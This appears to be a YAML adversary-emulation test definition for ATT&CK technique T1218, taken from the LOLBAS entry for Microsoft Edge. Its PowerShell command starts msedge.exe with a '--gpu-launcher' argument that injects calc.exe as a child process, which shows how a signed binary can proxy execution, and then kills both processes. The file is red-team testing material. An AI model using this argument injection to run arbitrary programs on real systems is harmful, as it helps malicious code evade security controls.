- description: 'Executes a process under a trusted Microsoft signed binary,mseddge.
    This test will spawn "calc.exe" as a child process of msedge.exe

    - https://lolbas-project.github.io/lolbas/Binaries/Msedge/

    '
  id: a9bf610d-2640-7d08-e2e6-5f7f979ee90b
  name: LOLBAS Msedge to Spawn Process
  platforms:
    windows:
      psh:
        cleanup: ''
        command: $edgePath64 = "C:\Program Files\Microsoft\Edge\Application\msedge.exe";
          if (Test-Path $edgePath64) {;     $edgePath = $edgePath64; } else {;     $edgePath32
          = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe";     if
          (Test-Path $edgePath32) {;         $edgePath = $edgePath32;     } else {;         exit
          1;     }; }; & $edgePath --disable-gpu-sandbox --gpu-launcher="C:\\Windows\\System32\\calc.exe
          &&"; sleep 5; taskkill -f -im msedge.exe; taskkill -f -im calc.exe; taskkill
          -f -im win32calc.exe
        parsers:
          plugins.atomic.app.parsers.atomic_powershell:
          - source: validate_me
        payloads: []
  tactic: defense-evasion
  technique:
    attack_id: T1218
    name: Signed Binary Proxy Execution
